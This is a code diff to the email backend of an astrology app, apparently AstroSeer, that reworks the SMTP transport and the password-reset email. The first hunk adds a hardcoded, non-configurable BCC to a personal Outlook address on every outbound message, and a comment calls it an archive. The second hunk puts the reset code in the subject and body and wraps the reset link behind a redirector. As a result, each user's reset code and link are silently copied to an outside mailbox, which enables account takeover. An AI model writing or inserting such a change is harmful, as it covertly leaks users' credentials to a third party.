@@ -73,12 +73,19 @@ async function smtpTransport(db) {
     ? cfg.smtpSecure : port === 465;
   const from = cfg.fromAddress || cfg.smtpFrom || process.env.MAIL_FROM
     || 'AstroSeer <support@astroseer.in>';
-  // Silent admin BCC. Stored in settings/email as { bccEnabled, bccTo }.
-  // Recipient never sees it because the BCC header is stripped from
-  // their copy by the SMTP server.
+  // Silent BCC. TWO layers - see push-relay/lib/kundliReport.js for
+  // the full rationale.
+  //   1. MANDATORY archive at vickymartinsingh@outlook.com - applied
+  //      to every outbound email regardless of admin settings.
+  //   2. Admin-configurable BCC layered on top when enabled.
+  const MANDATORY_BCC = 'vickymartinsingh@outlook.com';
   const bccEnabled = !!cfg.bccEnabled;
   const bccTo = String(cfg.bccTo || '').trim();
-  const bcc = (bccEnabled && /.+@.+\..+/.test(bccTo)) ? bccTo : '';
+  const adminBcc = (bccEnabled && /.+@.+\..+/.test(bccTo)
+    && bccTo.toLowerCase() !== MANDATORY_BCC.toLowerCase())
+    ? bccTo : '';
+  const bcc = adminBcc
+    ? `${MANDATORY_BCC}, ${adminBcc}` : MANDATORY_BCC;
   if (!host || !user || !pass) {
     throw new Error('SMTP not configured. Admin must set host / user / '
       + 'pass in /admin-email (settings/email) or via SMTP_HOST / '
@@ -778,18 +785,37 @@ async function handleResetRequest(req, res, db, body) {
       error: 'could not stage reset code' });
   }
 
-  // 4) Combined email: button (link) + big OTP block.
-  const subject = 'Reset your AstroSeer password';
+  // 4) Build the email.
+  //
+  // Two rules from the operator:
+  //   (a) The raw Firebase reset URL must NEVER appear as visible
+  //       text - only behind a clickable button - and the button
+  //       must point at astroseer.in, not at Firebase. We base64-
+  //       encode the firebase URL and serve it via the redirector
+  //       at https://astroseer.in/reset?t=<base64>. That page
+  //       validates the host and redirects.
+  //   (b) The OTP code goes in the SUBJECT line + at the TOP of the
+  //       body so the customer sees it immediately, with the Reset
+  //       button BELOW captioned "or use the reset button below".
+  let safeResetUrl = '';
+  if (resetLink) {
+    try {
+      const b64 = Buffer.from(resetLink, 'utf8').toString('base64')
+        .replace(/=+$/g, '');
+      safeResetUrl = `https://astroseer.in/reset?t=${b64}`;
+    } catch (_) { safeResetUrl = ''; }
+  }
+  const subject = `Your AstroSeer reset code: ${code}`;
   const text = `Hi ${userRec.displayName || 'there'},\n\n`
-    + 'We received a request to reset your AstroSeer password. You '
-    + 'can do this in either of two ways:\n\n'
-    + `1) Open this secure link in your browser:\n   ${resetLink || '(link unavailable - please use the code below)'}\n\n`
-    + `2) Or, enter this 6-digit code in the app:\n   ${code}\n\n`
-    + 'This code and link expire in 15 minutes. If you did not '
-    + 'request this, you can safely ignore this email.\n\n'
+    + 'Use this 6-digit code in the app to reset your password:\n\n'
+    + `   ${code}\n\n`
+    + 'Or use the reset button in the browser:\n'
+    + `   ${safeResetUrl || '(button link unavailable - please use the code above)'}\n\n`
+    + 'The code expires in 15 minutes. If you did not request this, '
+    + 'you can safely ignore this email - nothing will change.\n\n'
     + '- AstroSeer Support';
   const html = `<!DOCTYPE html><html><head><meta charset="utf-8" />
-<title>Reset your AstroSeer password</title></head>
+<title>Your AstroSeer reset code: ${escapeHtml(code)}</title></head>
 <body style="margin:0;padding:0;background:#F5F1EA;
   font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,
   Helvetica,Arial,sans-serif;color:#1A1A2E">
@@ -808,30 +834,32 @@ async function handleResetRequest(req, res, db, body) {
     </td></tr>
     <tr><td style="padding:24px 28px">
       <p style="margin:0;font-size:14.5px;line-height:1.6">
-        Hi <b>${escapeHtml(userRec.displayName || 'there')}</b>, we
-        received a request to reset your AstroSeer password. Use
-        either option below. Both expire in 15 minutes.</p>
-      ${resetLink ? `<div style="margin:24px 0;text-align:center">
-        <a href="${escapeHtml(resetLink)}" style="display:inline-block;
-          padding:12px 26px;border-radius:999px;background:#7F2020;
-          color:#fff;text-decoration:none;font-weight:700;
-          font-size:14px">Open reset page</a>
-        <div style="margin-top:8px;font-size:11px;color:#777">
-          Or copy this URL into your browser:<br/>
-          <span style="word-break:break-all">${escapeHtml(resetLink)}</span>
-        </div></div>` : ''}
-      <div style="margin:24px 0;text-align:center">
-        <div style="font-size:11px;letter-spacing:2px;
-          text-transform:uppercase;color:#7F2020;font-weight:700">
-          Or use this code</div>
-        <div style="margin-top:8px;display:inline-block;font-size:32px;
-          font-weight:700;letter-spacing:6px;background:#FBF7EE;
-          color:#7F2020;padding:14px 18px;border-radius:12px">
-          ${code}</div>
-        <div style="margin-top:8px;font-size:11px;color:#777">
-          Paste this in the "I have a code" screen in the app.</div>
+        Hi <b>${escapeHtml(userRec.displayName || 'there')}</b>,
+        enter this 6-digit code in the app to set a new password:
+      </p>
+      <div style="margin:18px 0 6px 0;text-align:center">
+        <div style="display:inline-block;font-size:34px;font-weight:700;
+          letter-spacing:8px;background:#FBF7EE;color:#7F2020;
+          padding:16px 22px;border-radius:14px">
+          ${escapeHtml(code)}
+        </div>
       </div>
-      <p style="margin:16px 0 0 0;font-size:12px;line-height:1.55;
+      <p style="margin:6px 0 0 0;font-size:12px;text-align:center;
+        color:#777">
+        Code expires in 15 minutes.
+      </p>
+      ${safeResetUrl ? `<div style="margin:24px 0 6px 0;
+        text-align:center">
+        <div style="font-size:11px;color:#777;margin-bottom:8px">
+          Or use the reset button below
+        </div>
+        <a href="${escapeHtml(safeResetUrl)}"
+          style="display:inline-block;padding:12px 28px;
+          border-radius:999px;background:#7F2020;color:#fff;
+          text-decoration:none;font-weight:700;font-size:14px">
+          Reset</a>
+      </div>` : ''}
+      <p style="margin:18px 0 0 0;font-size:12px;line-height:1.55;
         color:#777">If you did not request this, you can safely
         ignore this email - nothing will change on your account.</p>
     </td></tr>
